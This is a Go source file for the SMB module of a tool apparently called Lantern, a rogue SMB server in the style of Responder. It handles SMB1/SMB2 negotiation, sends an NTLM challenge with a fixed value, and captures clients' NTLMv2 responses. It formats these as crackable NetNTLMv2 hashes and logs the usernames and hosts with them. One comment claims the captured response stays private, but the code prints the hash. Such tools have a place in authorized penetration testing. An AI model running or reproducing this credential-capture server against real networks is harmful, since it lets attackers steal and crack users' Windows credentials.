package smb

import (
	"bytes"
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
	"strconv"
	"sync"
	"time"
	"unicode/utf16"

	"lantern/internal/core"
)

const (
	ServiceName = "smb"
	DefaultPort = 445
	maxReadSize = 64 * 1024
	readTimeout = 5 * time.Second
)

type Module struct {
	Address string
	Port    int
	Logger  *core.Logger

	mu       sync.Mutex
	listener net.Listener
	cancel   context.CancelFunc
	wg       sync.WaitGroup
}

func New(logger *core.Logger) *Module {
	return &Module{
		Address: "0.0.0.0",
		Port:    DefaultPort,
		Logger:  logger,
	}
}

func (m *Module) Name() string {
	return ServiceName
}

func (m *Module) HasListener() bool {
	return true
}

func (m *Module) HasPoisoner() bool {
	return false
}

func (m *Module) StartPoisoner(
	ctx context.Context,
	cfg core.Config,
) error {
	return errors.New("SMB poisoning is not supported")
}

func (m *Module) StartListener(
	ctx context.Context,
	cfg core.Config,
) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	if m.listener != nil {
		return errors.New("SMB listener is already running")
	}

	bindAddress := m.Address
	if cfg.InterfaceAddress != "" {
		bindAddress = cfg.InterfaceAddress
	}

	address := net.JoinHostPort(
		bindAddress,
		strconv.Itoa(m.Port),
	)

	listener, err := net.Listen("tcp", address)
	if err != nil {
		return fmt.Errorf("bind TCP %s: %w", address, err)
	}

	runCtx, cancel := context.WithCancel(ctx)
	m.listener = listener
	m.cancel = cancel

	m.log(core.Success, "Listening on %s", address)

	m.wg.Add(1)
	go m.serve(runCtx, listener)

	return nil
}

func (m *Module) serve(ctx context.Context, listener net.Listener) {
	defer m.wg.Done()
	defer func() {
		_ = listener.Close()
		m.mu.Lock()
		if m.listener == listener {
			m.listener = nil
			m.cancel = nil
		}
		m.mu.Unlock()
	}()

	go func() {
		<-ctx.Done()
		_ = listener.Close()
	}()

	for {
		conn, err := listener.Accept()
		if err != nil {
			if ctx.Err() != nil {
				return
			}
			m.log(core.Error, "Accept failed: %v", err)
			return
		}

		m.log(core.Info, "Incoming TCP connection from %s",
			conn.RemoteAddr())

		m.wg.Add(1)
		go func() {
			defer m.wg.Done()
			m.handleConnection(ctx, conn)
		}()
	}
}

func (m *Module) handleConnection(
	ctx context.Context,
	conn net.Conn,
) {
	defer conn.Close()
	waitingForType3 := false

	for {
		if deadline, ok := ctx.Deadline(); ok {
			_ = conn.SetDeadline(deadline)
		} else {
			_ = conn.SetDeadline(time.Now().Add(readTimeout))
		}

		header := make([]byte, 4)
		if _, err := io.ReadFull(conn, header); err != nil {
			if waitingForType3 && ctx.Err() == nil {
				m.packet("NTLMSSP", "No Type 3 response from %s after challenge: %v", conn.RemoteAddr(), err)
			}
			return
		}

		length := int(header[1])<<16 |
			int(header[2])<<8 |
			int(header[3])

		if header[0] != 0x00 || length == 0 || length > maxReadSize {
			return
		}

		payload := make([]byte, length)
		if _, err := io.ReadFull(conn, payload); err != nil {
			if waitingForType3 && ctx.Err() == nil {
				m.packet("NTLMSSP", "Incomplete Type 3 response from %s: %v", conn.RemoteAddr(), err)
			}
			return
		}

		isS1 := isSMB1(payload)
		isS2 := isSMB2(payload)

		// 1. Controllo NTLMSSP (Type 1 o Type 3) ovunque nel payload
		if domain, username, workstation, msgType, found := parseNTLMSSP(payload); found {
			if msgType == 1 {
				flags, _ := ntlmType1Flags(payload)
				m.packet("NTLMSSP", "Received Type 1 from %s (flags 0x%08x)", conn.RemoteAddr(), flags)
				var challenge []byte
				if isS1 {
					challenge = buildSMB1SessionSetupChallengeResponse(payload, 1)
				} else {
					challenge = buildSMB2SessionSetupChallengeResponse(payload, 1)
				}
				written, err := conn.Write(challenge)
				if err != nil {
					m.packet("NTLMSSP", "Failed to send Type 2 challenge to %s: %v", conn.RemoteAddr(), err)
					return
				}
				m.packet("NTLMSSP", "Sent Type 2 challenge to %s (%d bytes)", conn.RemoteAddr(), written)
				waitingForType3 = true
				continue
			} else if msgType == 3 {
				host := conn.RemoteAddr().String()
				if h, _, err := net.SplitHostPort(host); err == nil {
					host = h
				}

				userDisplay := username
				if domain != "" {
					userDisplay = fmt.Sprintf("%s\\%s", domain, username)
				} else {
					userDisplay = fmt.Sprintf("\\%s", username)
				}
				if workstation == "" {
					workstation = "<not provided>"
				}

				// Report the identity and source while keeping the captured response private.
				m.logAuthIdentity("NTLMv2-SSP", host, workstation, userDisplay, formatNTLMv2Hash(payload, domain, username))

				if isS1 {
					_, _ = conn.Write(buildSMB1SessionSetupSuccessResponse(payload, 1))
				} else {
					_, _ = conn.Write(buildSMB2SessionSetupSuccessResponse(payload, 1, 1))
				}
				return
			}
		}

		// 2. SMB2 Negotiate / Session Setup
		if isS2 {
			if len(payload) >= 14 {
				command := binary.LittleEndian.Uint16(payload[12:14])
				switch command {
				case 0x0000: // Negotiate
					m.packet("SMB2", "Negotiate request from %s", conn.RemoteAddr())
					_, _ = conn.Write(buildSMB2NegotiateResponse(payload))
					continue
				case 0x0001: // Session Setup
					m.packet("SMB2", "Session Setup request from %s", conn.RemoteAddr())
					_, _ = conn.Write(buildSMB2SessionSetupChallengeResponse(payload, 1))
					continue
				}
			}
		}

		// 3. SMB1 Negotiate / Session Setup AndX
		if isS1 {
			if len(payload) >= 5 {
				cmd := payload[4]
				if cmd == 0x72 {
					m.packet("SMB1", "Negotiate request from %s", conn.RemoteAddr())
					_, _ = conn.Write(buildSMB1NegotiateResponse(payload))
					continue
				} else if cmd == 0x73 {
					if domain, username, ok := parseSMB1LegacyIdentity(payload); ok {
						host := conn.RemoteAddr().String()
						if h, _, err := net.SplitHostPort(host); err == nil {
							host = h
						}
						userDisplay := username
						if domain != "" {
							userDisplay = domain + "\\" + username
						} else {
							userDisplay = "\\" + username
						}
						m.logAuthIdentity("SMB1", host, "<not provided>", userDisplay, "<not captured>")
						return
					}
					var flags2 uint16
					var wordCount byte
					if len(payload) >= 12 {
						flags2 = binary.LittleEndian.Uint16(payload[10:12])
					}
					if len(payload) >= 33 {
						wordCount = payload[32]
					}
					if wordCount != 12 || flags2&0x0800 == 0 {
						m.packet("SMB1", "Legacy Session Setup from %s has no NTLMSSP identity fields (word count %d, extended security %t)",
							conn.RemoteAddr(), wordCount, flags2&0x0800 != 0)
						return
					}
					m.packet("SMB1", "Session Setup AndX request from %s (challenge sent; waiting for NTLMSSP Type 3)", conn.RemoteAddr())
					_, _ = conn.Write(buildSMB1SessionSetupChallengeResponse(payload, 1))
					continue
				}
			}
		}

		m.packet("UNKNOWN", "Payload from %s is unrecognized", conn.RemoteAddr())
		return
	}
}

func isSMB2(payload []byte) bool {
	return len(payload) >= 4 &&
		payload[0] == 0xFE &&
		payload[1] == 'S' &&
		payload[2] == 'M' &&
		payload[3] == 'B'
}

func isSMB1(payload []byte) bool {
	return len(payload) >= 4 &&
		payload[0] == 0xFF &&
		payload[1] == 'S' &&
		payload[2] == 'M' &&
		payload[3] == 'B'
}

func parseNTLMSSP(data []byte) (domain, username, workstation string, msgType uint32, found bool) {
	idx := bytes.Index(data, []byte("NTLMSSP\x00"))
	if idx == -1 || idx+12 > len(data) {
		return "", "", "", 0, false
	}

	ntlmData := data[idx:]
	if len(ntlmData) < 12 {
		return "", "", "", 0, false
	}

	msgType = binary.LittleEndian.Uint32(ntlmData[8:12])
	ntlmFlags := uint32(0)
	if msgType == 3 && len(ntlmData) >= 64 {
		ntlmFlags = binary.LittleEndian.Uint32(ntlmData[60:64])
	}

	readSecBuffer := func(offset int) string {
		if offset+8 > len(ntlmData) {
			return ""
		}
		length := binary.LittleEndian.Uint16(ntlmData[offset : offset+2])
		bufOffset := binary.LittleEndian.Uint32(ntlmData[offset+4 : offset+8])
		if int(bufOffset)+int(length) <= len(ntlmData) && length > 0 {
			raw := ntlmData[bufOffset : int(bufOffset)+int(length)]
			if ntlmFlags&0x00000001 == 0 {
				return string(bytes.TrimRight(raw, "\x00"))
			}
			return decodeUTF16LE(raw)
		}
		return ""
	}

	if msgType == 1 {
		return "", "", "", 1, true
	}

	if msgType == 3 {
		domain = readSecBuffer(28)
		username = readSecBuffer(36)
		workstation = readSecBuffer(44)
		return domain, username, workstation, 3, true
	}

	return "", "", "", msgType, false
}

func ntlmType1Flags(data []byte) (uint32, bool) {
	idx := bytes.Index(data, []byte("NTLMSSP\x00"))
	if idx < 0 || idx+16 > len(data) || binary.LittleEndian.Uint32(data[idx+8:idx+12]) != 1 {
		return 0, false
	}
	return binary.LittleEndian.Uint32(data[idx+12 : idx+16]), true
}

func parseSMB1LegacyIdentity(data []byte) (domain, username string, found bool) {
	// The legacy Session Setup AndX request uses 13 words. Its account and
	// domain strings follow the password response fields in the byte area.
	if len(data) < 61 || data[32] != 13 {
		return "", "", false
	}
	flags2 := binary.LittleEndian.Uint16(data[10:12])
	oemPasswordLength := int(binary.LittleEndian.Uint16(data[47:49]))
	unicodePasswordLength := int(binary.LittleEndian.Uint16(data[49:51]))
	byteCount := int(binary.LittleEndian.Uint16(data[59:61]))
	dataStart := 61
	dataEnd := dataStart + byteCount
	if dataEnd > len(data) || oemPasswordLength+unicodePasswordLength > byteCount {
		return "", "", false
	}
	stringOffset := dataStart + oemPasswordLength + unicodePasswordLength
	unicode := flags2&0x8000 != 0
	if unicode && stringOffset%2 != 0 {
		stringOffset++
	}
	if stringOffset >= dataEnd {
		return "", "", false
	}
	readString := func(offset int) (string, int) {
		if offset >= dataEnd {
			return "", dataEnd
		}
		if unicode {
			if offset%2 != 0 {
				offset++
			}
			end := offset
			for end+1 < dataEnd && (data[end] != 0 || data[end+1] != 0) {
				end += 2
			}
			if end+1 >= dataEnd {
				return "", dataEnd
			}
			return decodeUTF16LE(data[offset:end]), end + 2
		}
		end := offset
		for end < dataEnd && data[end] != 0 {
			end++
		}
		if end == dataEnd {
			return "", dataEnd
		}
		return string(data[offset:end]), end + 1
	}

	username, stringOffset = readString(stringOffset)
	domain, _ = readString(stringOffset)
	return domain, username, username != ""
}

func (m *Module) logAuthIdentity(protocol, client, workstation, username, hash string) {
	if m.Logger == nil {
		return
	}
	m.Logger.PrintHighlighted(core.Warning, "",
		"[SMB] %s Client     : %s\n[SMB] %s Hostname  : %s\n[SMB] %s Username  : %s\n[SMB] %s Hash      : %s",
		protocol, client, protocol, workstation, protocol, username, protocol, hash)
}

// formatNTLMv2Hash returns the standard John/hashcat NetNTLMv2 representation
// for the NT challenge response in an NTLMSSP Type 3 message.
func formatNTLMv2Hash(data []byte, domain, username string) string {
	idx := bytes.Index(data, []byte("NTLMSSP\x00"))
	if idx < 0 || idx+64 > len(data) || binary.LittleEndian.Uint32(data[idx+8:idx+12]) != 3 {
		return "<not captured>"
	}
	ntlm := data[idx:]
	length := int(binary.LittleEndian.Uint16(ntlm[20:22]))
	offset := int(binary.LittleEndian.Uint32(ntlm[24:28]))
	if length < 17 || offset < 0 || offset+length > len(ntlm) {
		return "<not captured>"
	}
	response := ntlm[offset : offset+length]
	if len(response) < 17 || response[16] != 0x01 {
		return "<not captured>"
	}
	return fmt.Sprintf("%s::%s:%x:%x:%x", username, domain, []byte{1, 2, 3, 4, 5, 6, 7, 8}, response[:16], response[16:])
}

func decodeUTF16LE(b []byte) string {
	if len(b) == 0 {
		return ""
	}
	runes := make([]rune, 0, len(b)/2)
	for i := 0; i+1 < len(b); i += 2 {
		r := rune(binary.LittleEndian.Uint16(b[i : i+2]))
		if r == 0 {
			continue
		}
		runes = append(runes, r)
	}
	if len(runes) > 0 {
		return string(runes)
	}
	return string(b)
}

func wrapNetBIOS(data []byte) []byte {
	length := len(data)
	header := []byte{
		0x00,
		byte(length >> 16),
		byte(length >> 8),
		byte(length),
	}
	return append(header, data...)
}

func buildSMB1NegotiateResponse(req []byte) []byte {
	mid := uint16(0)
	if len(req) >= 32 {
		mid = binary.LittleEndian.Uint16(req[30:32])
	}
	dialectIndex, supportsNTLM := smb1NTLMDialectIndex(req)
	extendedSecurity := supportsNTLM && len(req) >= 12 &&
		binary.LittleEndian.Uint16(req[10:12])&0x0800 != 0

	header := []byte{
		0xff, 'S', 'M', 'B',
		0x72,                   // Negotiate Protocol response
		0x00, 0x00, 0x00, 0x00, // Status SUCCESS
		0x98,       // Flags: server response + case-insensitive + canonicalized paths
		0x07, 0xC8, // Flags2: Unicode, NT status, extended security
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, // TID
		0x00, 0x00, // PID
		0x00, 0x00, // UID
		byte(mid), byte(mid >> 8), // MID
	}
	if !extendedSecurity {
		header[10], header[11] = 0x20, 0x01
	}

	body := []byte{
		0x11,                                        // Word count (17 words)
		byte(dialectIndex), byte(dialectIndex >> 8), // Dialect Index
		0x03,       // Security Mode
		0x02, 0x00, // Max Mux Count
		0x01, 0x00, // Max Number VCs
		0x00, 0x00, 0x01, 0x00, // Max Buffer Size
		0x00, 0x00, 0x01, 0x00, // Max Raw Buffer
		0x00, 0x00, 0x00, 0x00, // Session Key
		0x54, 0x00, 0x00, 0x80, // Unicode, NT SMBs, NT status, extended security
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // System Time
		0x00, 0x00, // Server Time Zone
		0x00,       // Challenge Length (extended security)
		0x10, 0x00, // Byte count (16-byte server GUID)
	}
	if extendedSecurity {
		binary.LittleEndian.PutUint32(body[20:24], 0x80000054)
		body[34] = 0 // ChallengeLength is zero for extended security.
	} else {
		binary.LittleEndian.PutUint32(body[20:24], 0x00000001)
		body[34] = 8
	}

	pkt := append(header, body...)
	if extendedSecurity {
		pkt = append(pkt, []byte("LANTERN-SMB-GUID")...)
	} else {
		pkt = append(pkt, []byte{1, 2, 3, 4, 5, 6, 7, 8}...)
		pkt = append(pkt, []byte("LANTERN\x00")...)
	}
	return wrapNetBIOS(pkt)
}

func smb1NTLMDialectIndex(req []byte) (uint16, bool) {
	// SMB_COM_NEGOTIATE has a zero word count followed by ByteCount and
	// null-terminated dialect strings, each prefixed by 0x02.
	if len(req) < 35 || req[32] != 0 {
		return 0, false
	}
	byteCount := int(binary.LittleEndian.Uint16(req[33:35]))
	end := min(35+byteCount, len(req))
	index := uint16(0)
	for offset := 35; offset < end; {
		if req[offset] != 0x02 {
			return 0, false
		}
		offset++
		nameEnd := offset
		for nameEnd < end && req[nameEnd] != 0 {
			nameEnd++
		}
		if nameEnd == end {
			return 0, false
		}
		if string(bytes.ToUpper(req[offset:nameEnd])) == "NT LM 0.12" {
			return index, true
		}
		offset = nameEnd + 1
		index++
	}
	return 0, false
}

func buildSMB1SessionSetupChallengeResponse(req []byte, uid uint16) []byte {
	mid := uint16(0)
	pid := uint16(0)
	tid := uint16(0)
	if len(req) >= 32 {
		tid = binary.LittleEndian.Uint16(req[24:26])
		pid = binary.LittleEndian.Uint16(req[26:28])
		uid = binary.LittleEndian.Uint16(req[28:30])
		mid = binary.LittleEndian.Uint16(req[30:32])
	}
	if uid == 0 {
		uid = 1
	}

	clientFlags, _ := ntlmType1Flags(req)
	ntlmChallenge := buildNTLMSSPType2(clientFlags)
	spnegoBlob := buildSPNEGONTLMChallenge(ntlmChallenge)

	header := make([]byte, 32)
	copy(header[0:4], []byte("\xffSMB"))
	header[4] = 0x73                                       // Session Setup AndX response
	binary.LittleEndian.PutUint32(header[5:9], 0xC0000016) // STATUS_MORE_PROCESSING_REQUIRED
	header[9] = 0x98
	binary.LittleEndian.PutUint16(header[10:12], 0xC807)
	binary.LittleEndian.PutUint16(header[24:26], tid)
	binary.LittleEndian.PutUint16(header[26:28], pid)
	binary.LittleEndian.PutUint16(header[28:30], uid)
	binary.LittleEndian.PutUint16(header[30:32], mid)

	body := []byte{
		0x04,       // Word count = 4 for extended security
		0xff, 0x00, // AndX command + reserved
		0x00, 0x00, // AndX offset
		0x00, 0x00, // Action
		0x00, 0x00, // SecurityBlobLength
	}
	binary.LittleEndian.PutUint16(body[7:9], uint16(len(spnegoBlob)))
	responseData := append([]byte(nil), spnegoBlob...)
	if len(spnegoBlob)%2 == 0 {
		responseData = append(responseData, 0) // Align following Unicode strings.
	}
	responseData = appendSMBUnicodeString(responseData, "Unix")
	responseData = appendSMBUnicodeString(responseData, "Lantern")
	body = append(body, byte(len(responseData)), byte(len(responseData)>>8))

	pkt := append(header, body...)
	pkt = append(pkt, responseData...)
	return wrapNetBIOS(pkt)
}

func appendSMBUnicodeString(dst []byte, value string) []byte {
	return append(append(dst, encodeUTF16LE(value)...), 0, 0)
}

func encodeUTF16LE(value string) []byte {
	units := utf16.Encode([]rune(value))
	encoded := make([]byte, len(units)*2)
	for i, unit := range units {
		binary.LittleEndian.PutUint16(encoded[i*2:i*2+2], unit)
	}
	return encoded
}

func buildNTLMAVPair(id uint16, value []byte) []byte {
	pair := make([]byte, 4+len(value))
	binary.LittleEndian.PutUint16(pair[0:2], id)
	binary.LittleEndian.PutUint16(pair[2:4], uint16(len(value)))
	copy(pair[4:], value)
	return pair
}

func buildSMB1SessionSetupSuccessResponse(req []byte, uid uint16) []byte {
	mid := uint16(0)
	pid := uint16(0)
	tid := uint16(0)
	if len(req) >= 32 {
		tid = binary.LittleEndian.Uint16(req[24:26])
		pid = binary.LittleEndian.Uint16(req[26:28])
		uid = binary.LittleEndian.Uint16(req[28:30])
		mid = binary.LittleEndian.Uint16(req[30:32])
	}

	header := make([]byte, 32)
	copy(header[0:4], []byte("\xffSMB"))
	header[4] = 0x73                                       // Session Setup AndX response
	binary.LittleEndian.PutUint32(header[5:9], 0x00000000) // STATUS_SUCCESS
	header[9] = 0x98
	binary.LittleEndian.PutUint16(header[10:12], 0xC807)
	binary.LittleEndian.PutUint16(header[24:26], tid)
	binary.LittleEndian.PutUint16(header[26:28], pid)
	binary.LittleEndian.PutUint16(header[28:30], uid)
	binary.LittleEndian.PutUint16(header[30:32], mid)

	body := []byte{
		0x04,       // Word count = 4 for extended security
		0xff, 0x00, // AndX command + reserved
		0x00, 0x00, // AndX offset
		0x01, 0x00, // Action
		0x00, 0x00, // SecurityBlobLength
		0x00, 0x00, // ByteCount
	}

	pkt := append(header, body...)
	return wrapNetBIOS(pkt)
}

func buildSMB2NegotiateResponse(req []byte) []byte {
	messageID := uint64(0)
	if len(req) >= 32 {
		messageID = binary.LittleEndian.Uint64(req[24:32])
	}

	header := make([]byte, 64)
	copy(header[0:4], []byte("\xfeSMB"))
	binary.LittleEndian.PutUint16(header[4:6], 64)
	binary.LittleEndian.PutUint16(header[6:8], 1)
	binary.LittleEndian.PutUint16(header[12:14], 0)
	binary.LittleEndian.PutUint16(header[14:16], 1) // Credit response
	binary.LittleEndian.PutUint32(header[16:20], 1) // Server-to-client response flag
	binary.LittleEndian.PutUint64(header[24:32], messageID)

	body := make([]byte, 65)
	binary.LittleEndian.PutUint16(body[0:2], 65)
	binary.LittleEndian.PutUint16(body[2:4], 0x01)
	binary.LittleEndian.PutUint16(body[4:6], 0x0202)
	binary.LittleEndian.PutUint16(body[6:8], 1)
	copy(body[8:24], []byte("LANTERN-SMB-GUID"))
	binary.LittleEndian.PutUint32(body[24:28], 0)
	binary.LittleEndian.PutUint32(body[28:32], 65536)
	binary.LittleEndian.PutUint32(body[32:36], 65536)
	binary.LittleEndian.PutUint32(body[36:40], 65536)
	binary.LittleEndian.PutUint16(body[56:58], 128)
	binary.LittleEndian.PutUint16(body[58:60], 0)

	smbPacket := append(header, body...)
	return wrapNetBIOS(smbPacket)
}

func buildSMB2SessionSetupChallengeResponse(req []byte, sessionID uint64) []byte {
	messageID := uint64(0)
	if len(req) >= 32 {
		messageID = binary.LittleEndian.Uint64(req[24:32])
	}

	clientFlags, _ := ntlmType1Flags(req)
	ntlmChallenge := buildNTLMSSPType2(clientFlags)
	spnegoBlob := buildSPNEGONTLMChallenge(ntlmChallenge)

	header := make([]byte, 64)
	copy(header[0:4], []byte("\xfeSMB"))
	binary.LittleEndian.PutUint16(header[4:6], 64)
	binary.LittleEndian.PutUint16(header[6:8], 1)
	binary.LittleEndian.PutUint32(header[8:12], 0xC0000016) // STATUS_MORE_PROCESSING_REQUIRED
	binary.LittleEndian.PutUint16(header[12:14], 1)         // Session Setup
	binary.LittleEndian.PutUint16(header[14:16], 1)         // Credit response
	binary.LittleEndian.PutUint32(header[16:20], 1)         // Server-to-client response flag
	binary.LittleEndian.PutUint64(header[24:32], messageID)
	binary.LittleEndian.PutUint64(header[40:48], sessionID)

	body := make([]byte, 9)
	binary.LittleEndian.PutUint16(body[0:2], 9)
	body[2] = 0
	binary.LittleEndian.PutUint16(body[3:5], 72)
	binary.LittleEndian.PutUint16(body[5:7], uint16(len(spnegoBlob)))

	smbPacket := append(header, body...)
	smbPacket = append(smbPacket, spnegoBlob...)
	return wrapNetBIOS(smbPacket)
}

func buildSMB2SessionSetupSuccessResponse(req []byte, messageID uint64, sessionID uint64) []byte {
	if len(req) >= 32 {
		messageID = binary.LittleEndian.Uint64(req[24:32])
	}

	header := make([]byte, 64)
	copy(header[0:4], []byte("\xfeSMB"))
	binary.LittleEndian.PutUint16(header[4:6], 64)
	binary.LittleEndian.PutUint16(header[6:8], 1)
	binary.LittleEndian.PutUint32(header[8:12], 0) // STATUS_SUCCESS
	binary.LittleEndian.PutUint16(header[12:14], 1)
	binary.LittleEndian.PutUint16(header[14:16], 1) // Credit response
	binary.LittleEndian.PutUint32(header[16:20], 1) // Server-to-client response flag
	binary.LittleEndian.PutUint64(header[24:32], messageID)
	binary.LittleEndian.PutUint64(header[40:48], sessionID)

	body := make([]byte, 9)
	binary.LittleEndian.PutUint16(body[0:2], 9)
	body[2] = 0
	binary.LittleEndian.PutUint16(body[3:5], 72)
	binary.LittleEndian.PutUint16(body[5:7], 0)

	smbPacket := append(header, body...)
	return wrapNetBIOS(smbPacket)
}

func buildNTLMSSPType2(clientFlags uint32) []byte {
	const (
		negotiateUnicode     = 0x00000001
		negotiateOEM         = 0x00000002
		requestTarget        = 0x00000004
		negotiateNTLM        = 0x00000200
		negotiateAlwaysSign  = 0x00008000
		negotiateExtendedSec = 0x00080000
		negotiateTargetInfo  = 0x00800000
		negotiateVersion     = 0x02000000
		negotiate128         = 0x20000000
		negotiate56          = 0x80000000
	)
	flags := uint32(negotiateUnicode | requestTarget | negotiateNTLM | negotiateAlwaysSign |
		negotiateExtendedSec | negotiateTargetInfo | negotiateVersion | negotiate128 | negotiate56)
	if clientFlags != 0 {
		flags &= clientFlags | negotiateTargetInfo
		flags |= negotiateTargetInfo
	}
	if flags&negotiateUnicode == 0 && clientFlags&negotiateOEM != 0 {
		flags |= negotiateOEM
	}
	includeVersion := flags&negotiateVersion != 0
	// The Version slot remains part of the fixed Type 2 header even when the
	// client did not negotiate it; in that case its zero-initialized bytes stay zero.
	headerLength := 56

	targetName := []byte("LANTERN")
	targetNameBytes := targetName
	if flags&negotiateUnicode != 0 {
		targetNameBytes = make([]byte, len(targetName)*2)
		for i, c := range targetName {
			targetNameBytes[i*2] = c
			targetNameBytes[i*2+1] = 0
		}
	}

	avDomain := buildNTLMAVPair(2, encodeUTF16LE("LANTERN"))
	avComp := buildNTLMAVPair(1, encodeUTF16LE("LANTERN"))
	avDNSComp := buildNTLMAVPair(3, encodeUTF16LE("lantern.local"))
	avDNSDomain := buildNTLMAVPair(4, encodeUTF16LE("local"))

	avEol := []byte{0x00, 0x00, 0x00, 0x00}

	targetInfo := append(avDomain, avComp...)
	targetInfo = append(targetInfo, avDNSComp...)
	targetInfo = append(targetInfo, avDNSDomain...)
	targetInfo = append(targetInfo, avEol...)

	msg := make([]byte, headerLength+len(targetNameBytes)+len(targetInfo))
	copy(msg[0:8], []byte("NTLMSSP\x00"))
	binary.LittleEndian.PutUint32(msg[8:12], 2)

	binary.LittleEndian.PutUint16(msg[12:14], uint16(len(targetNameBytes)))
	binary.LittleEndian.PutUint16(msg[14:16], uint16(len(targetNameBytes)))
	binary.LittleEndian.PutUint32(msg[16:20], uint32(headerLength))

	binary.LittleEndian.PutUint32(msg[20:24], flags)
	copy(msg[24:32], []byte{0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08})

	targetInfoOffset := headerLength + len(targetNameBytes)
	binary.LittleEndian.PutUint16(msg[40:42], uint16(len(targetInfo)))
	binary.LittleEndian.PutUint16(msg[42:44], uint16(len(targetInfo)))
	binary.LittleEndian.PutUint32(msg[44:48], uint32(targetInfoOffset))

	if includeVersion {
		copy(msg[48:56], []byte{0x06, 0x01, 0xb1, 0x1d, 0x00, 0x00, 0x00, 0x0f})
	}

	copy(msg[headerLength:headerLength+len(targetNameBytes)], targetNameBytes)
	copy(msg[targetInfoOffset:targetInfoOffset+len(targetInfo)], targetInfo)

	return msg
}

func buildSPNEGONTLMChallenge(ntlmChallenge []byte) []byte {
	oidBytes := []byte{0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a}

	supportedMech := make([]byte, 0)
	supportedMech = append(supportedMech, 0xa1)
	supportedMech = append(supportedMech, byte(len(oidBytes)))
	supportedMech = append(supportedMech, oidBytes...)

	negState := []byte{0xa0, 0x03, 0x0a, 0x01, 0x01}

	octStr := make([]byte, 0)
	octStr = append(octStr, 0x04)
	octStr = append(octStr, encodeLength(len(ntlmChallenge))...)
	octStr = append(octStr, ntlmChallenge...)

	respToken := make([]byte, 0)
	respToken = append(respToken, 0xa2)
	respToken = append(respToken, encodeLength(len(octStr))...)
	respToken = append(respToken, octStr...)

	seqContent := append(negState, supportedMech...)
	seqContent = append(seqContent, respToken...)

	seq := make([]byte, 0)
	seq = append(seq, 0x30)
	seq = append(seq, encodeLength(len(seqContent))...)
	seq = append(seq, seqContent...)

	spnego := make([]byte, 0)
	spnego = append(spnego, 0xa1) // NegotiationToken.negTokenResp
	spnego = append(spnego, encodeLength(len(seq))...)
	spnego = append(spnego, seq...)

	return spnego
}

func encodeLength(l int) []byte {
	if l < 128 {
		return []byte{byte(l)}
	} else if l < 256 {
		return []byte{0x81, byte(l)}
	} else {
		return []byte{0x82, byte(l >> 8), byte(l & 0xff)}
	}
}

func (m *Module) Stop() {
	m.mu.Lock()
	cancel := m.cancel
	listener := m.listener
	m.mu.Unlock()

	if cancel != nil {
		cancel()
	}

	if listener != nil {
		_ = listener.Close()
	}
	m.wg.Wait()
	m.log(core.Info, "Listener stopped")
}

func (m *Module) log(level core.Level, format string, args ...any) {
	if m.Logger != nil {
		m.Logger.Print(level, "SMB", format, args...)
	}
}

func (m *Module) packet(packetType, format string, args ...any) {
	if m.Logger != nil {
		m.Logger.Packet(ServiceName, packetType, format, args...)
	}
}
